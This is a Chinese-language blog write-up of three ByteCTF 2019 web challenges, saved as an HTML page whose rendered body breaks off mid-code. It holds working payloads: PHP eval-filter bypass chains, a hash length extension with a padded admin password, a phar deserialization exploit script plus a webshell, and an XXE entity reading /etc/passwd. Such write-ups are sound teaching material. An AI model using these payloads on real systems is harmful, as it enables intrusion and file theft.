<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>bytectf2019 | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="boring code source code
&lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&#39;/data:\/\//i&#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&#39;url&#39;])){ $url = $_POST[&#39;url&#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) { $code = file_get_contents($url); if (&#39;;&#39; === preg_replace(&#39;/[a-z]&#43;\((?R)?\)/&#39;, NULL, $code)) { if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } } else { echo &#34;error: host not allowed&#34;; } } else { echo &#34;error: invalid url&#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="apple-touch-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="mask-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:title" content="bytectf2019" />
<meta property="og:description" content="boring code source code
&lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&#39;/data:\/\//i&#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&#39;url&#39;])){ $url = $_POST[&#39;url&#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) { $code = file_get_contents($url); if (&#39;;&#39; === preg_replace(&#39;/[a-z]&#43;\((?R)?\)/&#39;, NULL, $code)) { if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } } else { echo &#34;error: host not allowed&#34;; } } else { echo &#34;error: invalid url&#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/" />
<meta property="og:image" content="https://ch3n9w.cpolar.cn/image-20211114141103041.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-09-09T08:18:25+00:00" />
<meta property="article:modified_time" content="2019-09-09T08:18:25+00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://ch3n9w.cpolar.cn/image-20211114141103041.png" />
<meta name="twitter:title" content="bytectf2019"/>
<meta name="twitter:description" content="boring code source code
&lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&#39;/data:\/\//i&#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&#39;url&#39;])){ $url = $_POST[&#39;url&#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) { $code = file_get_contents($url); if (&#39;;&#39; === preg_replace(&#39;/[a-z]&#43;\((?R)?\)/&#39;, NULL, $code)) { if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } } else { echo &#34;error: host not allowed&#34;; } } else { echo &#34;error: invalid url&#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ch3n9w.cpolar.cn/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "bytectf2019",
      "item": "https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "bytectf2019",
  "name": "bytectf2019",
  "description": "boring code source code\n\u0026lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(\u0026#39;/data:\\/\\//i\u0026#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[\u0026#39;url\u0026#39;])){ $url = $_POST[\u0026#39;url\u0026#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(\u0026#39;/baidu\\.com$/\u0026#39;, $r[\u0026#39;host\u0026#39;])) { $code = file_get_contents($url); if (\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z]+\\((?R)?\\)/\u0026#39;, NULL, $code)) { if (preg_match(\u0026#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i\u0026#39;, $code)) { echo \u0026#39;bye~\u0026#39;; } else { eval($code); } } } else { echo \u0026#34;error: host not allowed\u0026#34;; } } else { echo \u0026#34;error: invalid url\u0026#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.",
  "keywords": [
    
  ],
  "articleBody": "boring code source code\n\u003c?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match('/data:\\/\\//i', $url)) { return false; } return true; } return false; } if (isset($_POST['url'])){ $url = $_POST['url']; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match('/baidu\\.com$/', $r['host'])) { $code = file_get_contents($url); if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) { if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) { echo 'bye~'; } else { eval($code); } } } else { echo \"error: host not allowed\"; } } else { echo \"error: invalid url\"; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload\nif(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv())))))))))))); 这两个payload都很精彩, 涉及的知识点如下:\ncrypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.\nord函数传入字符串的时候, 只返回第一个字符的ascii码\nlocaleconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是\"小数点字符\", 也就是点号\nphp \u003e var_dump(localeconv()); array(18) { [\"decimal_point\"]=\u003e string(1) \".\" [\"thousands_sep\"]=\u003e string(0) \"\" [\"int_curr_symbol\"]=\u003e string(0) \"\" [\"currency_symbol\"]=\u003e string(0) \"\" [\"mon_decimal_point\"]=\u003e string(0) \"\" [\"mon_thousands_sep\"]=\u003e string(0) \"\" [\"positive_sign\"]=\u003e string(0) \"\" [\"negative_sign\"]=\u003e string(0) \"\" [\"int_frac_digits\"]=\u003e int(127) [\"frac_digits\"]=\u003e int(127) [\"p_cs_precedes\"]=\u003e int(127) [\"p_sep_by_space\"]=\u003e int(127) [\"n_cs_precedes\"]=\u003e int(127) [\"n_sep_by_space\"]=\u003e int(127) [\"p_sign_posn\"]=\u003e int(127) [\"n_sign_posn\"]=\u003e int(127) [\"grouping\"]=\u003e array(0) { } [\"mon_grouping\"]=\u003e array(0) { } } php \u003e pos() 函数是current函数的别名\ntime() 返回时间戳整数, 从中无法提出点号\nlocaltime第一参数默认是time(), 不能接受布尔值也就是chdir的返回值\nlocaltime() 返回数组来表示当前时间, 第一项是当前的秒数, 要让chr转换成点号的话就要在第46秒执行\nezCMS 源码www.zip, 关键代码如下:\n身份验证部分\nfunction login(){ $secret = \"********\"; setcookie(\"hash\", md5($secret.\"adminadmin\")); return 1; } function is_admin(){ $secret = \"********\"; $username = $_SESSION['username']; $password = $_SESSION['password']; if ($username == \"admin\" \u0026\u0026 $password != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$username.$password)){ return 1; } } return 0; } 可以明显看出这里有哈希长度扩展攻击.\n哈希生成\n./hash_extender -d 'admin' -s 52107b08c0f3342d2153ae1d68e6262c -f md5 -a 'ch3n9w' --out-data-format=html -l 13 --quiet 得到了新的哈希值,添加到cookie[user]中\n然后新的登录用户名: admin\n用户密码:admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00ch3n9w\n第二部分反序列化代码审计.\nclass Check{ public $filename; function __construct($filename) { $this-\u003efilename = $filename; } function check(){ $content = file_get_contents($this-\u003efilename); $black_list = ['system','eval','exec','+','passthru','`','assert']; foreach ($black_list as $k=\u003e$v){ if (stripos($content, $v) !== false){ die(\"your file make me scare\"); } } return 1; } } class File{ public $filename; public $filepath; public $checker; function __construct($filename, $filepath) { $this-\u003efilepath = $filepath; $this-\u003efilename = $filename; } public function view_detail(){ if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this-\u003efilepath)){ die(\"nonono~\"); } $mine = mime_content_type($this-\u003efilepath); $store_path = $this-\u003eopen($this-\u003efilename, $this-\u003efilepath); $res['mine'] = $mine; $res['store_path'] = $store_path; return $res; } public function open($filename, $filepath){ $res = \"$filename is in $filepath\"; return $res; } function __destruct() { if (isset($this-\u003echecker)){ $this-\u003echecker-\u003eupload_file(); } } } class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $content_check; function __construct($filename, $file_tmp, $size) { $this-\u003eupload_dir = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']); if (!file_exists($this-\u003eupload_dir)){ mkdir($this-\u003eupload_dir, 0777, true); } if (!is_file($this-\u003eupload_dir.'/.htaccess')){ file_put_contents($this-\u003eupload_dir.'/.htaccess', 'lolololol, i control all'); } $this-\u003esize = $size; $this-\u003efilename = $filename; $this-\u003efile_tmp = $file_tmp; $this-\u003econtent_check = new Check($this-\u003efile_tmp); $profile = new Profile(); $this-\u003echecker = $profile-\u003eis_admin(); } public function upload_file(){ if (!$this-\u003echecker){ die('u r not admin'); } $this-\u003econtent_check -\u003e check(); $tmp = explode(\".\", $this-\u003efilename); $ext = end($tmp); if ($this-\u003esize \u003e 204800){ die(\"your file is too big\"); } move_uploaded_file($this-\u003efile_tmp, $this-\u003eupload_dir.'/'.md5($this-\u003efilename).'.'.$ext); } public function __call($name, $arguments) { } } class Profile{ public $username; public $password; public $admin; public function is_admin(){ $this-\u003eusername = $_SESSION['username']; $this-\u003epassword = $_SESSION['password']; $secret = \"********\"; if ($this-\u003eusername === \"admin\" \u0026\u0026 $this-\u003epassword != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$this-\u003eusername.$this-\u003epassword)){ return 1; } } return 0; } function __call($name, $arguments) { $this-\u003eadmin-\u003eopen($this-\u003eusername, $this-\u003epassword); } } 利用链:\n上传exp.phar 绕过waf使用php://filter/read=convert.base64-encode/resource=phar://exp.phar触发phar让他反序列中file类的destruct, upload_file触发profile的__call函数, 触发open函数 profile-\u003eadmin声明为ZipArchive类, 利用这个原生类的同名函数open来删除原有的.htaccess, 删除完之后再传一个shell就可以了 exp:\n\u003c?php class File{ public $filename; public $filepath; public $checker; function __construct() { $this-\u003echecker = new Admin(); } } class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $file_error; public $content_check; public $obj; public $filepath; function __construct() { $this-\u003echecker = 1; $this-\u003esize = 1024; $this-\u003econtent_check = new Profile(); } } class Profile{ public $username; public $password; public $admin; function __construct() { $this-\u003eadmin = new ZipArchive(); $this-\u003eusername = \"/var/www/html/sandbox/76c98b2e4f0f7a9a467bcf459b36ab5c/.htaccess\"; $this-\u003epassword = ZipArchive::OVERWRITE; } } @unlink(\"exp.phar\"); $phar = new Phar('exp.phar'); $phar -\u003e startBuffering(); $phar -\u003e setStub('GIF89a'.'\u003c?php __HALT_COMPILER();?\u003e'); $phar -\u003e addFromString('test.txt','test'); $object = new File(); $phar -\u003e setMetadata($object); $phar -\u003e stopBuffering(); shell.php\n\u003c?php echo file_get_contents('/flag'); rss data protocol format:\ndata:[][;charset=][;base64], 说是php对mine type不敏感, 那么可以这样子写\ndata://baidu.com/plain;base64,xxxxxxxxx== 然后看rss的定义:\nWhat is RSS?\nIt is a format to share data, defined in the 1.0 version of XML. You can deliver information in this format et one can get this information, and information from other various sources, in this format. Information provided by a website in an XML file is called an RSS feed. Recent browsers can read directly RSS files, but a special RSS reader or aggregator may be used too.\n所以所谓的rss就是xml.\n尝试测试\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE title [ \u003c!ELEMENT title ANY \u003e \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\" \u003e]\u003e ",
  "wordCount" : "787",
  "inLanguage": "en",
  "image":"https://ch3n9w.cpolar.cn/image-20211114141103041.png","datePublished": "2019-09-09T08:18:25Z",
  "dateModified": "2019-09-09T08:18:25Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ch3n9w.cpolar.cn/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="https://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ch3n9w.cpolar.cn/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="https://ch3n9w.cpolar.cn/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      bytectf2019
    </h1>
    <div class="post-meta"><span title='2019-09-09 08:18:25 +0000 UTC'>September 9, 2019</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;787 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> 
<figure class="entry-cover">
        <img loading="eager" srcset="https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/image-20211114141103041_hu2d08db2862132674184bfa2ddce09fb4_543669_360x0_resize_box_3.png 360w ,https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/image-20211114141103041_hu2d08db2862132674184bfa2ddce09fb4_543669_480x0_resize_box_3.png 480w ,https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/image-20211114141103041_hu2d08db2862132674184bfa2ddce09fb4_543669_720x0_resize_box_3.png 720w ,https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/image-20211114141103041.png 917w" 
            sizes="(min-width: 768px) 720px, 100vw" src="https://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/image-20211114141103041.png" alt="" 
            width="917" height="577">
        
</figure><div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#boring-code">boring code</a></li>
    <li><a href="#ezcms">ezCMS</a></li>
    <li><a href="#rss">rss</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="boring-code">boring code<a hidden class="anchor" aria-hidden="true" href="#boring-code">#</a></h2>
<p>source code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_valid_url</span>($url) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filter_var</span>($url, <span style="color:#a6e22e">FILTER_VALIDATE_URL</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/data:\/\//i&#39;</span>, $url)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;url&#39;</span>])){
</span></span><span style="display:flex;"><span>    $url <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;url&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_valid_url</span>($url)) {
</span></span><span style="display:flex;"><span>        $r <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($url);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/baidu\.com$/&#39;</span>, $r[<span style="color:#e6db74">&#39;host&#39;</span>])) {
</span></span><span style="display:flex;"><span>            $code <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($url);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[a-z]+\((?R)?\)/&#39;</span>, <span style="color:#66d9ef">NULL</span>, $code)) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;</span>, $code)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;bye~&#39;</span>;
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">eval</span>($code);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;error: host not allowed&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;error: invalid url&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload</p>
<pre tabindex="0"><code>if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));
</code></pre><pre tabindex="0"><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));
</code></pre><p>这两个payload都很精彩, 涉及的知识点如下:</p>
<ul>
<li>
<p>crypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.</p>
</li>
<li>
<p>ord函数传入字符串的时候, 只返回第一个字符的ascii码</p>
</li>
<li>
<p>localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是&quot;小数点字符&quot;,  也就是点号</p>
</li>
<li>
<pre tabindex="0"><code>php &gt; var_dump(localeconv());
array(18) {
  [&#34;decimal_point&#34;]=&gt;
  string(1) &#34;.&#34;
  [&#34;thousands_sep&#34;]=&gt;
  string(0) &#34;&#34;
  [&#34;int_curr_symbol&#34;]=&gt;
  string(0) &#34;&#34;
  [&#34;currency_symbol&#34;]=&gt;
  string(0) &#34;&#34;
  [&#34;mon_decimal_point&#34;]=&gt;
  string(0) &#34;&#34;
  [&#34;mon_thousands_sep&#34;]=&gt;
  string(0) &#34;&#34;
  [&#34;positive_sign&#34;]=&gt;
  string(0) &#34;&#34;
  [&#34;negative_sign&#34;]=&gt;
  string(0) &#34;&#34;
  [&#34;int_frac_digits&#34;]=&gt;
  int(127)
  [&#34;frac_digits&#34;]=&gt;
  int(127)
  [&#34;p_cs_precedes&#34;]=&gt;
  int(127)
  [&#34;p_sep_by_space&#34;]=&gt;
  int(127)
  [&#34;n_cs_precedes&#34;]=&gt;
  int(127)
  [&#34;n_sep_by_space&#34;]=&gt;
  int(127)
  [&#34;p_sign_posn&#34;]=&gt;
  int(127)
  [&#34;n_sign_posn&#34;]=&gt;
  int(127)
  [&#34;grouping&#34;]=&gt;
  array(0) {
  }
  [&#34;mon_grouping&#34;]=&gt;
  array(0) {
  }
}
php &gt;
</code></pre></li>
<li>
<p>pos() 函数是current函数的别名</p>
</li>
<li>
<p>time() 返回时间戳整数, 从中无法提出点号</p>
</li>
<li>
<p>localtime第一参数默认是time(), 不能接受布尔值也就是chdir的返回值</p>
</li>
<li>
<p>localtime() 返回数组来表示当前时间, 第一项是当前的秒数, 要让chr转换成点号的话就要在第46秒执行</p>
</li>
</ul>
<h2 id="ezcms">ezCMS<a hidden class="anchor" aria-hidden="true" href="#ezcms">#</a></h2>
<p>源码<code>www.zip</code>, 关键代码如下:</p>
<p>身份验证部分</p>
<pre tabindex="0"><code>function login(){
    $secret = &#34;********&#34;;
    setcookie(&#34;hash&#34;, md5($secret.&#34;adminadmin&#34;));
    return 1;

}
function is_admin(){
    $secret = &#34;********&#34;;
    $username = $_SESSION[&#39;username&#39;];
    $password = $_SESSION[&#39;password&#39;];
    if ($username == &#34;admin&#34; &amp;&amp; $password != &#34;admin&#34;){
        if ($_COOKIE[&#39;user&#39;] === md5($secret.$username.$password)){
            return 1;
        }
    }
    return 0;
}
</code></pre><p>可以明显看出这里有哈希长度扩展攻击.</p>
<p>哈希生成</p>
<pre tabindex="0"><code>./hash_extender -d &#39;admin&#39; -s 52107b08c0f3342d2153ae1d68e6262c -f md5 -a &#39;ch3n9w&#39; --out-data-format=html -l 13 --quiet
</code></pre><p>得到了新的哈希值,添加到cookie[user]中</p>
<p>然后新的登录用户名: admin</p>
<p>用户密码:admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00ch3n9w</p>
<p>第二部分反序列化代码审计.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Check</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filename;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct($filename)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> $filename;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>(){
</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>        $black_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;system&#39;</span>,<span style="color:#e6db74">&#39;eval&#39;</span>,<span style="color:#e6db74">&#39;exec&#39;</span>,<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;passthru&#39;</span>,<span style="color:#e6db74">&#39;`&#39;</span>,<span style="color:#e6db74">&#39;assert&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($black_list <span style="color:#66d9ef">as</span> $k<span style="color:#f92672">=&gt;</span>$v){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($content, $v) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;your file make me scare&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">File</span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filename;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $filepath;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $checker;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct($filename, $filepath)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filepath</span> <span style="color:#f92672">=</span> $filepath;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> $filename;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
